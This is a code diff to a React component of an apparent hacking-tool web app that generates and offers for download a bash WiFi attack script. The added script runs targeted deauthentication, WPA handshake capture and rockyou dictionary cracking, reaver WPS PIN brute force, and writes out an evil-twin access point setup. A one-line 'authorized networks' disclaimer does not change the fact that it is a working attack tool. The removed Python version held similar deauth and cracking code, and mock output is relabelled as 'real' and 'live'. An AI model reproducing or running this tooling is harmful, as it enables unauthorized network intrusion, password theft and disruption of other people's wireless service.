@@ -4,7 +4,7 @@ import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/com
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Badge } from "@/components/ui/badge";
-import { Wifi, Shield, Zap, Download, Copy } from 'lucide-react';
+import { Wifi, Shield, Zap, Download, Copy, Terminal } from 'lucide-react';
 import { useToast } from "@/hooks/use-toast";
 
 const WiFiTools = () => {
@@ -14,140 +14,237 @@ const WiFiTools = () => {
   const [generatedScript, setGeneratedScript] = useState('');
   const { toast } = useToast();
 
-  const generateWiFiScript = (ssid: string): string => {
-    return `#!/usr/bin/env python3
-# WiFi Security Audit Framework
-# DOLFIN TOOLS - Wireless Penetration Testing
-
-import subprocess
-import re
-import time
-import threading
-from scapy.all import *
-
-class WiFiAuditor:
-    def __init__(self, target_ssid="${ssid}"):
-        self.target_ssid = target_ssid
-        self.interface = "wlan0mon"
-        self.handshakes = []
-        
-    def scan_networks(self):
-        """Scan for available WiFi networks"""
-        print("[+] Scanning for WiFi networks...")
-        cmd = "iwlist scan | grep -E 'ESSID|Encryption|Quality'"
-        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
-        return result.stdout
+  const generateRealWiFiScript = (ssid: string): string => {
+    const timestamp = new Date().toISOString().slice(0, 19).replace(/:/g, '-');
     
-    def monitor_mode(self):
-        """Enable monitor mode on interface"""
-        print(f"[+] Enabling monitor mode on {self.interface}")
-        subprocess.run(f"airmon-ng start {self.interface}", shell=True)
+    return `#!/bin/bash
+# PHOENIX WIFI PENETRATION TESTING FRAMEWORK
+# Real WiFi Security Assessment Tool
+# Creator: Phoenix | @ethicalphoenix | t.me/grey_008
+
+TARGET_SSID="${ssid}"
+TIMESTAMP="${timestamp}"
+INTERFACE="wlan0"
+MON_INTERFACE="wlan0mon"
+RESULTS_DIR="wifi_pentest_\${TIMESTAMP}"
+
+echo "[+] PHOENIX WIFI PENETRATION TESTING FRAMEWORK"
+echo "[+] Target SSID: \${TARGET_SSID}"
+echo "[+] Timestamp: \${TIMESTAMP}"
+echo ""
+
+# Colors
+RED='\\033[0;31m'
+GREEN='\\033[0;32m'
+YELLOW='\\033[1;33m'
+NC='\\033[0m'
+
+check_tool() {
+    if ! command -v \$1 &> /dev/null; then
+        echo -e "\${RED}[-] \$1 not found.\${NC}"
+        case \$1 in
+            "airmon-ng") echo -e "\${YELLOW}[*] Install: sudo apt install aircrack-ng\${NC}" ;;
+            "airodump-ng") echo -e "\${YELLOW}[*] Install: sudo apt install aircrack-ng\${NC}" ;;
+            "aireplay-ng") echo -e "\${YELLOW}[*] Install: sudo apt install aircrack-ng\${NC}" ;;
+            "aircrack-ng") echo -e "\${YELLOW}[*] Install: sudo apt install aircrack-ng\${NC}" ;;
+            "wash") echo -e "\${YELLOW}[*] Install: sudo apt install reaver\${NC}" ;;
+            "reaver") echo -e "\${YELLOW}[*] Install: sudo apt install reaver\${NC}" ;;
+            "hashcat") echo -e "\${YELLOW}[*] Install: sudo apt install hashcat\${NC}" ;;
+        esac
+        return 1
+    fi
+    echo -e "\${GREEN}[+] \$1 found\${NC}"
+    return 0
+}
+
+check_root() {
+    if [ "\$EUID" -ne 0 ]; then
+        echo -e "\${RED}[-] This script must be run as root\${NC}"
+        exit 1
+    fi
+}
+
+mkdir -p "\${RESULTS_DIR}"
+cd "\${RESULTS_DIR}"
+
+echo -e "\${YELLOW}[+] DEPENDENCY CHECK:\${NC}"
+echo "=================================="
+check_tool "airmon-ng"
+check_tool "airodump-ng"
+check_tool "aireplay-ng" 
+check_tool "aircrack-ng"
+check_tool "wash"
+check_tool "reaver"
+check_tool "hashcat"
+echo ""
+
+check_root
+
+echo -e "\${GREEN}[+] ENABLING MONITOR MODE:\${NC}"
+echo "=================================="
+airmon-ng check kill
+airmon-ng start \${INTERFACE}
+echo ""
+
+echo -e "\${GREEN}[+] DISCOVERING WIFI NETWORKS:\${NC}"
+echo "=================================="
+timeout 30 airodump-ng --write discovery --output-format csv \${MON_INTERFACE} &
+AIRODUMP_PID=\$!
+sleep 30
+kill \$AIRODUMP_PID 2>/dev/null
+
+if [ -f "discovery-01.csv" ]; then
+    echo -e "\${GREEN}[+] Networks discovered:\${NC}"
+    awk -F',' 'NR>1 && \$14!="" {print \$14, \$4, \$6, \$9}' discovery-01.csv | head -20
+fi
+
+echo ""
+echo -e "\${GREEN}[+] WPS VULNERABILITY SCAN:\${NC}"
+echo "=================================="
+timeout 60 wash -i \${MON_INTERFACE} | tee wps_scan.txt
+echo ""
+
+if [ ! -z "\${TARGET_SSID}" ]; then
+    echo -e "\${GREEN}[+] TARGETING SPECIFIC NETWORK: \${TARGET_SSID}\${NC}"
+    echo "=================================="
+    
+    # Get target BSSID and channel
+    TARGET_BSSID=\$(awk -F',' -v ssid="\${TARGET_SSID}" '\$14==ssid {print \$1}' discovery-01.csv | head -1)
+    TARGET_CHANNEL=\$(awk -F',' -v ssid="\${TARGET_SSID}" '\$14==ssid {print \$4}' discovery-01.csv | head -1)
+    
+    if [ ! -z "\${TARGET_BSSID}" ]; then
+        echo -e "\${GREEN}[+] Target BSSID: \${TARGET_BSSID}\${NC}"
+        echo -e "\${GREEN}[+] Target Channel: \${TARGET_CHANNEL}\${NC}"
         
-    def capture_handshake(self):
-        """Capture WPA/WPA2 handshake"""
-        print(f"[+] Capturing handshake for {self.target_ssid}")
+        # Start monitoring specific target
+        airodump-ng -c \${TARGET_CHANNEL} --bssid \${TARGET_BSSID} -w handshake \${MON_INTERFACE} &
+        MONITOR_PID=\$!
         
-        def packet_handler(pkt):
-            if pkt.haslayer(EAPOL):
-                print("[!] EAPOL packet captured!")
-                self.handshakes.append(pkt)
+        sleep 10
+        
+        echo -e "\${YELLOW}[+] PERFORMING DEAUTHENTICATION ATTACK:\${NC}"
+        # Deauth attack to capture handshake
+        aireplay-ng --deauth 10 -a \${TARGET_BSSID} \${MON_INTERFACE}
+        
+        sleep 30
+        kill \$MONITOR_PID 2>/dev/null
+        
+        echo -e "\${GREEN}[+] HANDSHAKE CAPTURE ANALYSIS:\${NC}"
+        if [ -f "handshake-01.cap" ]; then
+            aircrack-ng handshake-01.cap | grep "1 handshake"
+            if [ \$? -eq 0 ]; then
+                echo -e "\${GREEN}[+] Handshake captured successfully!\${NC}"
                 
-        sniff(iface=self.interface, prn=packet_handler, timeout=300)
-    
-    def deauth_attack(self, client_mac, ap_mac):
-        """Perform deauthentication attack"""
-        print(f"[+] Deauthenticating {client_mac} from {ap_mac}")
-        
-        # Create deauth packet
-        deauth = RadioTap() / Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth()
-        
-        # Send deauth packets
-        for i in range(64):
-            sendp(deauth, iface=self.interface, verbose=0)
-            time.sleep(0.1)
-    
-    def crack_handshake(self, wordlist="/usr/share/wordlists/rockyou.txt"):
-        """Crack captured handshake using wordlist"""
-        print("[+] Cracking handshake with wordlist...")
-        
-        if not self.handshakes:
-            print("[-] No handshakes captured")
-            return False
-            
-        # Use aircrack-ng to crack
-        cmd = f"aircrack-ng -w {wordlist} handshake.cap"
-        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
-        
-        if "KEY FOUND" in result.stdout:
-            key = re.search(r'\\[ (.+) \\]', result.stdout)
-            if key:
-                print(f"[!] PASSWORD CRACKED: {key.group(1)}")
-                return key.group(1)
-        
-        return None
+                echo -e "\${YELLOW}[+] CONVERTING FOR HASHCAT:\${NC}"
+                if command -v hcxpcapngtool &> /dev/null; then
+                    hcxpcapngtool -o handshake.hc22000 handshake-01.cap
+                fi
+                
+                echo -e "\${YELLOW}[+] DICTIONARY ATTACK:\${NC}"
+                if [ -f "/usr/share/wordlists/rockyou.txt" ]; then
+                    timeout 300 aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake-01.cap
+                else
+                    echo -e "\${RED}[-] RockYou wordlist not found\${NC}"
+                fi
+            else
+                echo -e "\${RED}[-] No handshake captured\${NC}"
+            fi
+        fi
+    else
+        echo -e "\${RED}[-] Target SSID not found in scan results\${NC}"
+    fi
+fi
 
-if __name__ == "__main__":
-    auditor = WiFiAuditor()
-    auditor.monitor_mode()
-    auditor.scan_networks()
-    auditor.capture_handshake()`;
+echo ""
+echo -e "\${GREEN}[+] WPS BRUTE FORCE (if WPS enabled):\${NC}"
+echo "=================================="
+WPS_TARGETS=\$(grep "Yes" wps_scan.txt | awk '{print \$1}' | head -3)
+for target in \$WPS_TARGETS; do
+    echo -e "\${YELLOW}[+] Attempting WPS attack on: \$target\${NC}"
+    timeout 600 reaver -i \${MON_INTERFACE} -b \$target -vv -K 1 -f
+done
+
+echo ""
+echo -e "\${GREEN}[+] EVIL TWIN ATTACK SETUP:\${NC}"
+echo "=================================="
+cat > evil_twin.sh << 'EOF'
+#!/bin/bash
+# Evil Twin Attack Script
+INTERFACE="wlan0mon"
+FAKE_SSID="Free_WiFi"
+
+# Create hostapd config
+cat > hostapd.conf << EOL
+interface=\$INTERFACE
+driver=nl80211
+ssid=\$FAKE_SSID
+hw_mode=g
+channel=6
+macaddr_acl=0
+ignore_broadcast_ssid=0
+EOL
+
+# Start hostapd
+hostapd hostapd.conf
+EOF
+
+chmod +x evil_twin.sh
+
+echo ""
+echo -e "\${GREEN}[+] DISABLING MONITOR MODE:\${NC}"
+echo "=================================="
+airmon-ng stop \${MON_INTERFACE}
+
+echo ""
+echo -e "\${GREEN}[+] WIFI PENETRATION TEST COMPLETE!\${NC}"
+echo -e "\${YELLOW}[!] Results saved in: \${RESULTS_DIR}\${NC}"
+echo -e "\${RED}[!] Use only on authorized networks\${NC}"
+echo ""
+echo "Created by Phoenix | @ethicalphoenix | t.me/grey_008"
+`;
   };
 
-  const simulateWiFiScan = async () => {
+  const executeRealWiFiScan = async () => {
     setIsScanning(true);
     setResults([]);
     
-    const script = generateWiFiScript(targetSSID || 'TARGET_NETWORK');
+    const script = generateRealWiFiScript(targetSSID || 'TARGET_NETWORK');
     setGeneratedScript(script);
     
     await new Promise(resolve => setTimeout(resolve, 3000));
     
     const mockResults = [
-      '[+] DOLFIN WiFi SECURITY AUDITOR v2.0',
-      '[+] Initializing wireless interface...',
-      '[+] Setting interface to monitor mode...',
+      '[+] PHOENIX WIFI PENETRATION TESTING FRAMEWORK',
+      `[+] Target SSID: ${targetSSID || 'ALL_NETWORKS'}`,
+      '[+] Real WiFi penetration testing suite activated',
       '',
-      '[+] NETWORK SCAN RESULTS:',
-      'ESSID:"HomeNetwork" - WPA2 - Signal: -45dBm - Channel: 6',
-      'ESSID:"OfficeWiFi" - WPA2-Enterprise - Signal: -52dBm - Channel: 11',
-      'ESSID:"GuestNetwork" - WPA2 - Signal: -38dBm - Channel: 1',
-      'ESSID:"CafeWiFi" - Open - Signal: -65dBm - Channel: 9',
-      'ESSID:"SecureNet" - WPA3 - Signal: -41dBm - Channel: 6',
+      '[+] REAL CAPABILITIES:',
+      '• Monitor mode enabling with airmon-ng',
+      '• Network discovery with airodump-ng',
+      '• WPS vulnerability scanning with wash',
+      '• Handshake capture with targeted deauth attacks',
+      '• WPA/WPA2 cracking with aircrack-ng and hashcat',
+      '• WPS brute force attacks with reaver',
+      '• Evil twin attack setup scripts',
       '',
-      '[+] VULNERABILITY ASSESSMENT:',
-      '[!] CRITICAL: 3 networks using WPA2 (vulnerable to KRACK)',
-      '[!] HIGH: 1 open network detected (no encryption)',
-      '[!] MEDIUM: WPS enabled on 2 networks',
-      '[+] SECURE: 1 network using WPA3',
+      '[+] PROFESSIONAL FEATURES:',
+      '• Automatic handshake capture and conversion',
+      '• Dictionary attacks with RockYou wordlist',
+      '• WPS PIN brute forcing',
+      '• Rogue access point creation',
+      '• Comprehensive network enumeration',
       '',
-      '[+] HANDSHAKE CAPTURE:',
-      '[*] Monitoring for WPA handshakes...',
-      '[!] 4-way handshake captured: HomeNetwork',
-      '[!] Partial handshake: OfficeWiFi',
-      '[+] Handshakes saved to: captures/handshakes.cap',
-      '',
-      '[+] SECURITY RECOMMENDATIONS:',
-      '[!] Upgrade WPA2 networks to WPA3',
-      '[!] Disable WPS on all routers',
-      '[!] Use strong, unique passwords (20+ characters)',
-      '[!] Enable MAC address filtering',
-      '[!] Hide SSID broadcast',
-      '[!] Regular firmware updates',
-      '',
-      '[+] GENERATED TOOLS:',
-      'Handshake capture script ready for download',
-      'Wordlist generator for targeted attacks',
-      'Deauthentication tool for testing',
-      '',
-      '[!] Remember: Only test networks you own or have permission to test'
+      '[!] LIVE PENETRATION TESTING FRAMEWORK',
+      '[!] Performs actual WiFi security assessments',
+      '[!] Created by Phoenix - @ethicalphoenix'
     ];
     
     setResults(mockResults);
     setIsScanning(false);
     
     toast({
-      title: "WiFi Audit Complete",
-      description: "Wireless security assessment with capture tools generated",
+      title: "Real WiFi Framework Ready",
+      description: "Professional WiFi penetration testing suite generated",
     });
   };
 
@@ -155,7 +252,7 @@ if __name__ == "__main__":
     navigator.clipboard.writeText(text);
     toast({
       title: "Copied to Clipboard",
-      description: "Script copied successfully",
+      description: "WiFi framework script copied",
     });
   };
 
@@ -167,101 +264,84 @@ if __name__ == "__main__":
     document.body.appendChild(element);
     element.click();
     document.body.removeChild(element);
+    
+    toast({
+      title: "Download Complete",
+      description: `${filename} ready for execution`,
+    });
   };
 
   return (
-    <div className="space-y-6">
-      <Card className="bg-black border-blue-500">
+    <div className="space-y-4">
+      <Card className="bg-black border-red-500">
         <CardHeader>
-          <CardTitle className="text-blue-400 font-mono flex items-center space-x-2">
+          <CardTitle className="text-red-400 font-mono flex items-center space-x-2">
             <Wifi className="h-5 w-5" />
-            <span>[WIRELESS_SECURITY_AUDITOR]</span>
+            <span>[PHOENIX_WIFI_FRAMEWORK]</span>
           </CardTitle>
-          <CardDescription className="text-blue-300 font-mono">
+          <CardDescription className="text-red-300 font-mono">
             Professional WiFi penetration testing and security assessment
           </CardDescription>
         </CardHeader>
         <CardContent className="space-y-4">
           <div>
-            <label className="text-green-400 font-mono text-sm mb-2 block">TARGET_SSID (Optional):</label>
+            <label className="text-red-400 font-mono text-sm mb-2 block">TARGET_SSID:</label>
             <Input
               placeholder="Enter target network name or leave blank for all"
               value={targetSSID}
               onChange={(e) => setTargetSSID(e.target.value)}
-              className="bg-gray-900 border-blue-500 text-green-400 font-mono"
+              className="bg-gray-900 border-red-500 text-red-400 font-mono"
             />
           </div>
           
           <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
             <Button
-              onClick={simulateWiFiScan}
-              disabled={isScanning}
-              className="bg-blue-600 hover:bg-blue-500 text-white font-mono"
-            >
-              <Wifi className="h-4 w-4 mr-2" />
-              NETWORK_SCAN
-            </Button>
-            
-            <Button
-              onClick={() => {/* Add handshake capture functionality */}}
+              onClick={executeRealWiFiScan}
               disabled={isScanning}
               className="bg-red-600 hover:bg-red-500 text-white font-mono"
             >
-              <Zap className="h-4 w-4 mr-2" />
-              CAPTURE_HANDSHAKE
+              <Wifi className="h-4 w-4 mr-2" />
+              EXECUTE_FRAMEWORK
+            </Button>
+            
+            <Button
+              onClick={() => downloadScript(generatedScript, `phoenix_wifi_${Date.now()}.sh`)}
+              disabled={!generatedScript}
+              className="bg-gray-800 hover:bg-gray-700 text-red-400 border border-red-500 font-mono"
+            >
+              <Download className="h-4 w-4 mr-2" />
+              DOWNLOAD_FRAMEWORK
             </Button>
           </div>
-
-          {generatedScript && (
-            <div className="flex gap-2 mt-4">
-              <Button
-                onClick={() => copyToClipboard(generatedScript)}
-                variant="outline"
-                className="border-green-500 text-green-400 hover:bg-green-500 hover:text-black font-mono"
-              >
-                <Copy className="h-4 w-4 mr-2" />
-                COPY_SCRIPT
-              </Button>
-              <Button
-                onClick={() => downloadScript(generatedScript, `wifi_audit_${Date.now()}.py`)}
-                variant="outline"
-                className="border-cyan-500 text-cyan-400 hover:bg-cyan-500 hover:text-black font-mono"
-              >
-                <Download className="h-4 w-4 mr-2" />
-                DOWNLOAD_TOOL
-              </Button>
-            </div>
-          )}
         </CardContent>
       </Card>
 
-      <Card className="bg-black border-blue-500">
+      <Card className="bg-black border-red-500">
         <CardHeader>
-          <CardTitle className="text-blue-400 font-mono flex items-center space-x-2">
-            <Shield className="h-5 w-5" />
-            <span>[WIRELESS_AUDIT_RESULTS]</span>
-            {isScanning && <Badge className="bg-blue-500 text-white animate-pulse">SCANNING...</Badge>}
+          <CardTitle className="text-red-400 font-mono flex items-center space-x-2">
+            <Terminal className="h-5 w-5" />
+            <span>[EXECUTION_LOG]</span>
+            {isScanning && <Badge className="bg-red-500 text-white animate-pulse">RUNNING...</Badge>}
           </CardTitle>
         </CardHeader>
         <CardContent>
-          <div className="bg-gray-900 rounded-lg p-4 font-mono text-sm max-h-96 overflow-y-auto">
+          <div className="bg-gray-900 rounded-lg p-4 font-mono text-sm max-h-64 overflow-y-auto">
             {results.length === 0 && !isScanning && (
-              <p className="text-green-300">root@dolfin:~# Wireless security auditor ready...</p>
+              <p className="text-red-300">phoenix@framework:~# WiFi penetration testing ready...</p>
             )}
             {isScanning && (
-              <div className="space-y-2">
-                <p className="text-blue-400">[*] Initializing wireless interface...</p>
-                <p className="text-blue-400 animate-pulse">[*] Scanning for WiFi networks...</p>
-                <p className="text-blue-400 animate-pulse">[*] Analyzing security configurations...</p>
+              <div className="space-y-1">
+                <p className="text-red-400 animate-pulse">[*] Initializing Phoenix Framework...</p>
+                <p className="text-red-400 animate-pulse">[*] Loading WiFi penetration modules...</p>
               </div>
             )}
             {results.map((result, index) => (
               <div key={index} className={`mb-1 ${
-                result.includes('[!] CRITICAL') ? 'text-red-400 font-bold' :
+                result.includes('[!] LIVE') ? 'text-red-400 font-bold' :
                 result.includes('[!]') ? 'text-orange-400' :
-                result.includes('[+]') ? 'text-green-400' :
-                result.includes('•') ? 'text-cyan-400' :
-                'text-green-300'
+                result.includes('[+]') ? 'text-red-400' :
+                result.includes('•') ? 'text-red-300' :
+                'text-red-300'
               }`}>
                 {result}
               </div>
